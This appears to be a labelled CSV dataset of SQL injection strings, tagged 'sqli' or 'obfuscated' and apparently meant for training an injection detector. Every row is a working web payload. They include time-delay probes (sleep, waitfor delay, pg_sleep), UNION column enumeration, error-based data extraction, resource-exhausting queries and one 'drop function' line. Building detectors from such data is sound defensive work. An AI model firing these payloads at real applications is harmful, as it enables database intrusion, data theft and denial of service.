query,label,source,label_name
"1"" where 3227  =  3227 waitfor delay '0:0:5'--",1,kaggle_sqli,sqli
"-8002'   )    )     )   union all select 6647,6647,6647--",1,kaggle_sqli,sqli
select   (  case when   (  9732  =  7136  )   then 9732 else 9732*  (  select 9732 from information_schema.character_sets  )   end  )  #,1,kaggle_sqli,sqli
"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",1,kaggle_sqli,sqli
"1%'   )    )    union all select null,null#",1,kaggle_sqli,sqli
"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",1,kaggle_sqli,sqli
" end and   (  ""nuix"" like ""nuix",1,kaggle_sqli,sqli
1' and   (  3020  =  3020  )  *6703 and 'tmng' like 'tmng,1,kaggle_sqli,sqli
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,kaggle_sqli,sqli
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'jueq'  =  'jueq",1,kaggle_sqli,sqli
1' and sleep  (  5  )   and 'usgv' like 'usgv,1,kaggle_sqli,sqli
"1%""   )    )    and 2006  =  2006",1,kaggle_sqli,sqli
"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,kaggle_sqli,sqli
waitfor delay '0:0:5' and    (    (     (  '%'  =  ',1,kaggle_sqli,sqli
"-8777""  )   as lalf where 8606  =  8606 or elt  (  4397  =  5823,5823  )  --",1,kaggle_sqli,sqli
"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,kaggle_sqli,sqli
"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",1,kaggle_sqli,sqli
"-9531'   )    )     )   union all select 4076,4076#",1,kaggle_sqli,sqli
"-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --",1,kaggle_sqli,sqli
"1""  )   union all select null,null,null,null#",1,kaggle_sqli,sqli
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",2,kaggle_sqli,obfuscated
select   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,kaggle_sqli,sqli
"-5379'  )   union all select 4294,4294,4294--",1,kaggle_sqli,sqli
"1  )   where 6990  =  6990 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,kaggle_sqli,sqli
1  )   as kaew where 2658  =  2658,1,kaggle_sqli,sqli
-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,1,kaggle_sqli,sqli
"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",2,kaggle_sqli,obfuscated
1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',1,kaggle_sqli,sqli
"-5672%"" or 3825  =  9675--",1,kaggle_sqli,sqli
1' where 2547  =  2547 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,kaggle_sqli,sqli
select sleep  (  5  )   and    (    (   '%'  =  ',1,kaggle_sqli,sqli
select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #,1,kaggle_sqli,sqli
1 and 5934  =  7745,1,kaggle_sqli,sqli
-4960'  )   union all select 5300--,1,kaggle_sqli,sqli
1'   )    )    or sleep  (  5  )  #,1,kaggle_sqli,sqli
"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,kaggle_sqli,sqli
1  )   or sleep  (  5  ) ,1,kaggle_sqli,sqli
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""tfrs""  =  ""tfrs",1,kaggle_sqli,sqli
"1%'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  '",2,kaggle_sqli,obfuscated
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'fnjm'  =  'fnjm",2,kaggle_sqli,obfuscated
"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--",1,kaggle_sqli,sqli
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kird'  =  'kird",2,kaggle_sqli,obfuscated
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  4976  =  4976",1,kaggle_sqli,sqli
"-1263""  )   or 9323  =  9323#",1,kaggle_sqli,sqli
select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,1,kaggle_sqli,sqli
1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,1,kaggle_sqli,sqli
1 where 7224  =  7224 and sleep  (  5  )  #,1,kaggle_sqli,sqli
-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  1248  =  1248,1,kaggle_sqli,sqli
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'mabd'  =  'mabd,1,kaggle_sqli,sqli
1'   )    )    as xpmy where 5274  =  5274 rlike   (  select   (  case when   (  6252  =  7704  )   then 1 else 0x28 end   )    )   --,1,kaggle_sqli,sqli
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'nuis'  =  'nuis,1,kaggle_sqli,sqli
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1,kaggle_sqli,sqli
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",1,kaggle_sqli,sqli
"1""  )   where 6311  =  6311",1,kaggle_sqli,sqli
"-7423 or make_set  (  9354  =  9354,7185  )  -- hprc",1,kaggle_sqli,sqli
1'+  (  select taga where 8036  =  8036,1,kaggle_sqli,sqli
"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,2,kaggle_sqli,obfuscated
"1'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'jicq' like 'jicq",2,kaggle_sqli,obfuscated
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,2,kaggle_sqli,obfuscated
"-1351"" where 6968  =  6968 or 5684  =  8582",1,kaggle_sqli,sqli
"-1030"" where 2161  =  2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",1,kaggle_sqli,sqli
"-4764""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""dfvz"" like ""dfvz",2,kaggle_sqli,obfuscated
"1 where 1776  =  1776 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
"1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
"-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  --",1,kaggle_sqli,sqli
"1%"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
1'||  (  select 'cfff' where 4994  =  4994,1,kaggle_sqli,sqli
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,kaggle_sqli,sqli
1'+  (  select 'leok' where 4320  =  4320,1,kaggle_sqli,sqli
"1'+  (  select 'uijv' where 7279  =  7279 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,kaggle_sqli,sqli
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473",1,kaggle_sqli,sqli
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1,kaggle_sqli,sqli
"-5579%""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,2,kaggle_sqli,obfuscated
1  )   where 2734  =  2734 waitfor delay '0:0:5'--,1,kaggle_sqli,sqli
1'||  (  select 'qgnz' where 6446  =  6446,1,kaggle_sqli,sqli
1'   )    )    as nhkp where 8030  =  8030,1,kaggle_sqli,sqli
"1%""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""%""  =  """,2,kaggle_sqli,obfuscated
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '",1,kaggle_sqli,sqli
1   )    )    as gygm where 4024  =  4024,1,kaggle_sqli,sqli
"-2448%""  )   or 3038  =  3038",1,kaggle_sqli,sqli
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr",2,kaggle_sqli,obfuscated
1'+  (  select ijoh where 7145  =  7145 order by 1--,1,kaggle_sqli,sqli
1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,kaggle_sqli,sqli
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1,kaggle_sqli,sqli
if  (  1087  =  5839  )   select 1087 else drop function zzeh--,1,kaggle_sqli,sqli
-8753  )   order by 1#,1,kaggle_sqli,sqli
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",1,kaggle_sqli,sqli
"-1485'   )    )     )   union all select 7661,7661,7661,7661,7661--",1,kaggle_sqli,sqli
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""%""  =  """,1,kaggle_sqli,sqli
1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,1,kaggle_sqli,sqli
"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",1,kaggle_sqli,sqli
"1%'  )   union all select null,null,null,null,null,null,null,null,null#",1,kaggle_sqli,sqli
1'+  (  select wpai where 3685  =  3685,1,kaggle_sqli,sqli
-6165%'   )    )    union all select 5384#,1,kaggle_sqli,sqli
1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,1,kaggle_sqli,sqli
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,kaggle_sqli,sqli
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'frpo' like 'frpo",2,kaggle_sqli,obfuscated
"1""  )   where 2656  =  2656 or sleep  (  5  )  --",1,kaggle_sqli,sqli
-7786'   )    )    or 9323  =  9323#,1,kaggle_sqli,sqli
"1'||  (  select 'gwxc' from dual where 3626  =  3626 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
-5534 or 1983  =  5721#,1,kaggle_sqli,sqli
1'   )    )    as grne where 9003  =  9003 order by 1--,1,kaggle_sqli,sqli
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",2,kaggle_sqli,obfuscated
"1""   )    )    as hkrh where 3060  =  3060 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",2,kaggle_sqli,obfuscated
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'rqyz'  =  'rqyz",2,kaggle_sqli,obfuscated
"-5439"" or 2559  =  4692 and ""dcrf"" like ""dcrf",1,kaggle_sqli,sqli
"1""  )   as kndn where 9314  =  9314",1,kaggle_sqli,sqli
-6030%'  )   or 3038  =  3038,1,kaggle_sqli,sqli
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",2,kaggle_sqli,obfuscated
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # tqmr",1,kaggle_sqli,sqli
1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,1,kaggle_sqli,sqli
-1910' or 2624  =  3371 and 'umoy'  =  'umoy,1,kaggle_sqli,sqli
-7293'   )    )     )   or 3038  =  3038,1,kaggle_sqli,sqli
"select sleep  (  5  )   and   (  ""%""  =  """,1,kaggle_sqli,sqli
"1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,kaggle_sqli,sqli
"1'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",2,kaggle_sqli,obfuscated
"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  6786  =  6786",2,kaggle_sqli,obfuscated
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3#",1,kaggle_sqli,sqli
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",1,kaggle_sqli,sqli
"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,kaggle_sqli,sqli
"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu",1,kaggle_sqli,sqli
1'  )   as twny where 9580  =  9580,1,kaggle_sqli,sqli
"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1,kaggle_sqli,sqli
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'bvdw'  =  'bvdw",2,kaggle_sqli,obfuscated
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",2,kaggle_sqli,obfuscated
"-3884"" where 8012  =  8012 union all select 8012,8012#",1,kaggle_sqli,sqli
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc",2,kaggle_sqli,obfuscated
select sleep  (  5  )   and    (    (   'srfc' like 'srfc,1,kaggle_sqli,sqli
1  )   waitfor delay '0:0:5' and   (  2993  =  2993,1,kaggle_sqli,sqli
"1""  )   where 1666  =  1666 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,kaggle_sqli,sqli
"1""   )    )   ",1,kaggle_sqli,sqli
"-5572""  )   union all select 8131,8131#",1,kaggle_sqli,sqli
"1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,kaggle_sqli,sqli
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,1,kaggle_sqli,sqli
-3026  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,kaggle_sqli,sqli
